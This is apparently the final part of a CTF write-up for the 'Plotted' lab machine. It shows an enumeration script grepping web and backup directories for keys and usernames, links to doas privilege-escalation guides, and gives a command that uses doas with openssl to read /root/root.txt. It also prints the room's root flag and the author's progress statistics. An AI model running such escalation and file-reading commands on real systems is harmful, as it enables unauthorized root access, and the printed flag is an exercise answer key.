/home/plot_admin/tms_backup/management/plugins/bootstrap/js/bootstrap.js:  var DATA_API_KEY$1 = '.data-api';
/home/plot_admin/tms_backup/management/plugins/bootstrap/js/bootstrap.js:  var DATA_API_KEY$2 = '.data-api';
/home/plot_admin/tms_backup/management/plugins/bootstrap/js/bootstrap.js:  var DATA_API_KEY$3 = '.data-api';
/home/plot_admin/tms_backup/management/plugins/bootstrap/js/bootstrap.js:  var DATA_API_KEY$4 = '.data-api';
/home/plot_admin/tms_backup/management/plugins/bootstrap/js/bootstrap.js:  var DATA_API_KEY$5 = '.data-api';
/home/plot_admin/tms_backup/management/plugins/bootstrap/js/bootstrap.js:  var DATA_API_KEY$6 = '.data-api';
/home/plot_admin/tms_backup/management/plugins/bootstrap/js/bootstrap.js:  var DATA_API_KEY$7 = '.data-api';
/home/plot_admin/tms_backup/management/plugins/bootstrap/js/bootstrap.js:  var DATA_API_KEY = '.data-api';
/home/plot_admin/tms_backup/management/plugins/tempusdominus-bootstrap-4/js/tempusdominus-bootstrap-4.js:      DATA_API_KEY = '.data-api',
/home/plot_admin/tms_backup/plugins/bootstrap/js/bootstrap.bundle.js:  var DATA_API_KEY$1 = '.data-api';
/home/plot_admin/tms_backup/plugins/bootstrap/js/bootstrap.bundle.js:  var DATA_API_KEY$2 = '.data-api';
/home/plot_admin/tms_backup/plugins/bootstrap/js/bootstrap.bundle.js:  var DATA_API_KEY$3 = '.data-api';
/home/plot_admin/tms_backup/plugins/bootstrap/js/bootstrap.bundle.js:  var DATA_API_KEY$4 = '.data-api';
/home/plot_admin/tms_backup/plugins/bootstrap/js/bootstrap.bundle.js:  var DATA_API_KEY$5 = '.data-api';
/home/plot_admin/tms_backup/plugins/bootstrap/js/bootstrap.bundle.js:  var DATA_API_KEY$6 = '.data-api';
/home/plot_admin/tms_backup/plugins/bootstrap/js/bootstrap.bundle.js:  var DATA_API_KEY$7 = '.data-api';
/home/plot_admin/tms_backup/plugins/bootstrap/js/bootstrap.bundle.js:  var DATA_API_KEY = '.data-api';
/home/plot_admin/tms_backup/plugins/bootstrap/js/bootstrap.js:  var DATA_API_KEY$1 = '.data-api';
/home/plot_admin/tms_backup/plugins/bootstrap/js/bootstrap.js:  var DATA_API_KEY$2 = '.data-api';
/home/plot_admin/tms_backup/plugins/bootstrap/js/bootstrap.js:  var DATA_API_KEY$3 = '.data-api';
/home/plot_admin/tms_backup/plugins/bootstrap/js/bootstrap.js:  var DATA_API_KEY$4 = '.data-api';
/home/plot_admin/tms_backup/plugins/bootstrap/js/bootstrap.js:  var DATA_API_KEY$5 = '.data-api';
/home/plot_admin/tms_backup/plugins/bootstrap/js/bootstrap.js:  var DATA_API_KEY$6 = '.data-api';
/home/plot_admin/tms_backup/plugins/bootstrap/js/bootstrap.js:  var DATA_API_KEY$7 = '.data-api';
/home/plot_admin/tms_backup/plugins/bootstrap/js/bootstrap.js:  var DATA_API_KEY = '.data-api';
/home/plot_admin/tms_backup/plugins/tempusdominus-bootstrap-4/js/tempusdominus-bootstrap-4.js:      DATA_API_KEY = '.data-api',
/var/www/html/445/management/plugins/bootstrap/js/bootstrap.bundle.js:  var DATA_API_KEY$1 = '.data-api';
/var/www/html/445/management/plugins/bootstrap/js/bootstrap.bundle.js:  var DATA_API_KEY$2 = '.data-api';
/var/www/html/445/management/plugins/bootstrap/js/bootstrap.bundle.js:  var DATA_API_KEY$3 = '.data-api';
/var/www/html/445/management/plugins/bootstrap/js/bootstrap.bundle.js:  var DATA_API_KEY$4 = '.data-api';
/var/www/html/445/management/plugins/bootstrap/js/bootstrap.bundle.js:  var DATA_API_KEY$5 = '.data-api';
/var/www/html/445/management/plugins/bootstrap/js/bootstrap.bundle.js:  var DATA_API_KEY$6 = '.data-api';
/var/www/html/445/management/plugins/bootstrap/js/bootstrap.bundle.js:  var DATA_API_KEY$7 = '.data-api';
/var/www/html/445/management/plugins/bootstrap/js/bootstrap.bundle.js:  var DATA_API_KEY = '.data-api';
/var/www/html/445/management/plugins/bootstrap/js/bootstrap.js:  var DATA_API_KEY$1 = '.data-api';
/var/www/html/445/management/plugins/bootstrap/js/bootstrap.js:  var DATA_API_KEY$2 = '.data-api';
/var/www/html/445/management/plugins/bootstrap/js/bootstrap.js:  var DATA_API_KEY$3 = '.data-api';
/var/www/html/445/management/plugins/bootstrap/js/bootstrap.js:  var DATA_API_KEY$4 = '.data-api';
/var/www/html/445/management/plugins/bootstrap/js/bootstrap.js:  var DATA_API_KEY$5 = '.data-api';
/var/www/html/445/management/plugins/bootstrap/js/bootstrap.js:  var DATA_API_KEY$6 = '.data-api';
/var/www/html/445/management/plugins/bootstrap/js/bootstrap.js:  var DATA_API_KEY$7 = '.data-api';
/var/www/html/445/management/plugins/bootstrap/js/bootstrap.js:  var DATA_API_KEY = '.data-api';
/var/www/html/445/management/plugins/tempusdominus-bootstrap-4/js/tempusdominus-bootstrap-4.js:      DATA_API_KEY = '.data-api',

[+] Finding 'username' string inside /home /var/www /var/backups /tmp /etc /root /mnt (limit 70)
/home/plot_admin/tms_backup/admin/login.php:          <input type="text" class="form-control" name="username" placeholder="Username">
/home/plot_admin/tms_backup/classes/DBConnection.php:    private $username = DB_USERNAME;
/home/plot_admin/tms_backup/management/admin/login.php:          <input type="text" class="form-control" name="username" placeholder="Username">
/home/plot_admin/tms_backup/management/classes/DBConnection.php:    private $username = DB_USERNAME;
/home/plot_admin/tms_backup/management/plugins/jquery/jquery.js:		username: null,
/home/plot_admin/tms_backup/plugins/jquery/jquery.js:		username: null,
/var/www/html/445/management/admin/login.php:          <input type="text" class="form-control" name="username" placeholder="Username">
/var/www/html/445/management/classes/DBConnection.php:    private $username = DB_USERNAME;
/var/www/html/445/management/plugins/jquery/jquery.js:		username: null,
```

<p>https://hacktricks.boitatech.com.br/linux-unix/privilege-escalation#doas</p>

![image](https://github.com/user-attachments/assets/ff220241-0d04-46b8-a962-ec0b0916e520)

<br>

<p>https://www.thegeekdiary.com/doas-executes-a-command-as-another-user/</p>

![image](https://github.com/user-attachments/assets/ae8ce18c-7802-43ba-82ca-5a8eeee60bd9)

![image](https://github.com/user-attachments/assets/f5f5805b-3792-46c0-9df5-59bb0afb907d)

<p>https://linuxtldr.com/install-doas/</p>

<br>

<p>1.2. What is root.txt?<br>
<code>53f85e2da3e874426fa059040a9bdcab</code></p>

```bash
plot_admin@plotted:/etc/cloud$ doas -u root openssl enc -in /root/root.txt
Congratulations on completing this room!

53f85e2da3e874426fa059040a9bdcab

Hope you enjoyed the journey!

Do let me know if you have any ideas/suggestions for future rooms.
-sa.infinity8888
```

<br>
<br>

![image](https://github.com/user-attachments/assets/1708fc15-c3ef-4ddd-be1a-4ac7c159a3fc)

![image](https://github.com/user-attachments/assets/0d21ea5d-cdcb-466e-b1bb-69689266d49f)

<br>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| July 6, 2025      | 426      |     163rd    |      5ᵗʰ     |     852nd   |    21st    |  113,028 |    831    |     63    |

</div>

![image](https://github.com/user-attachments/assets/30519452-fab2-466f-a9ab-a102f2ce926d)

![image](https://github.com/user-attachments/assets/fef71e32-33ee-4026-bc8c-b7b5bdd54adb)

![image](https://github.com/user-attachments/assets/68a419c9-cb31-4bfe-8e79-897e0adea726)

![image](https://github.com/user-attachments/assets/ee2c20a7-87d0-4fb6-a31d-521a3d4491e2)

![image](https://github.com/user-attachments/assets/1ab0b966-8c27-45df-8201-3bf850b6fa33)
